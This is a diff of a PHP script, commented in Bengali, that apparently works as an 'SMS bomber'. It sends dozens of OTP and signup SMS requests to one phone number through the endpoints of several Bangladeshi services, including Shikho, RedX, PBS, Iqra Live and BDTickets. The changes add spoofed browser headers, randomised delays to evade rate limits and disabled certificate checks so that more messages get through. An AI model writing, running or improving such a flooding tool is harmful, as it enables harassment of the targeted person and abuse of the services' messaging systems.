@@ -11,11 +11,9 @@ $phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
 $phone_88 = "88" . $phone_11;
 $phone_plus88 = "+88" . $phone_11;
 
-function execute_request($url, $method = 'POST', $data = [], $headers = [], $custom_sleep = 0) {
-    // যদি কাস্টম ডিলে দেওয়া থাকে তবে সেটি ব্যবহার করবে, নাহলে ডিফল্ট ৪-৬ সেকেন্ড
-    $sleep_time = $custom_sleep > 0 ? $custom_sleep : rand(4, 6);
-    sleep($sleep_time);
-    
+// কমন ফাংশন (BDTickets ছাড়া বাকিগুলোর জন্য)
+function execute_request($url, $method = 'POST', $data = [], $headers = []) {
+    sleep(rand(4, 6));
     $ch = curl_init();
     $default_headers = [
         'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
@@ -46,8 +44,8 @@ $results = [];
 // 1. Shikho (3 বার)
 for($i=1; $i<=3; $i++){
     $results["shikho_$i"] = execute_request('https://api.shikho.com/auth/v2/send/sms', 'POST', 
-        ["phone" => $phone_88, "type" => "student", "auth_type" => "signup"], 
-        ['Content-Type: application/json', 'Referer: https://shikho.com/']);
+        ["phone" => "88".$phone_11, "type" => "student", "auth_type" => "signup"], 
+        ['Content-Type: application/json', 'Referer: https://shikho.com/', 'Origin: https://shikho.com']);
 }
 
 // 2. RedX (10 বার)
@@ -64,7 +62,7 @@ for($i=1; $i<=10; $i++){
 // 4. PBS (5 বার)
 for($i=1; $i<=5; $i++){
     $results["pbs_$i"] = execute_request('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', 
-        ["userPhone" => $phone_11], ['Content-Type: application/json']);
+        ["userPhone" => $phone_11], ['Content-Type: application/json', 'Origin: https://pbs.com.bd']);
 }
 
 // 5. Iqra Live (3 বার)
@@ -72,13 +70,37 @@ for($i=1; $i<=3; $i++){
     $results["iqra_$i"] = execute_request("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET');
 }
 
-// 6. BDTickets (10 বার) - ১০টাই আসার জন্য অতিরিক্ত ডিলে যোগ করা হয়েছে
+// 6. BDTickets (10 বার) - অরিজিনাল ডাইরেক্ট cURL মেথড
 for($i=1; $i<=10; $i++){
-    $results["bdtickets_$i"] = execute_request('https://api.bdtickets.com:20100/v1/auth', 'POST', 
-        ["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"], 
-        ['Content-Type: application/json', 'Host: api.bdtickets.com:20100', 'Referer: https://bdtickets.com/'],
-        rand(6, 9) // BDTickets-এর রিকোয়েস্টের মাঝে ৬ থেকে ৯ সেকেন্ডের বিরতি
-    );
+    sleep(rand(6, 9)); // BDTickets-এর জন্য স্পেশাল ডিলে
+    $curl = curl_init();
+    curl_setopt_array($curl, [
+      CURLOPT_URL => 'https://api.bdtickets.com:20100/v1/auth',
+      CURLOPT_RETURNTRANSFER => true,
+      CURLOPT_ENCODING => '',
+      CURLOPT_MAXREDIRS => 10,
+      CURLOPT_TIMEOUT => 30,
+      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+      CURLOPT_CUSTOMREQUEST => 'POST',
+      CURLOPT_POSTFIELDS => '{"createUserCheck":true,"phoneNumber":"'.$phone_plus88.'","applicationChannel":"WEB_APP"}',
+      CURLOPT_SSL_VERIFYPEER => false,
+      CURLOPT_HTTPHEADER => [
+        'Host: api.bdtickets.com:20100',
+        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36',
+        'Accept: application/json, text/plain, */*',
+        'Content-Type: application/json',
+        'origin: https://bdtickets.com',
+        'referer: https://bdtickets.com/',
+        'sec-fetch-site: same-site',
+        'sec-fetch-mode: cors',
+        'sec-fetch-dest: empty'
+      ],
+    ]);
+    $res = curl_exec($curl);
+    $info = curl_getinfo($curl);
+    curl_close($curl);
+    
+    $results["bdtickets_$i"] = ["status" => $info['http_code'], "response" => json_decode($res, true) ?: $res];
 }
 
 echo json_encode($results, JSON_PRETTY_PRINT);
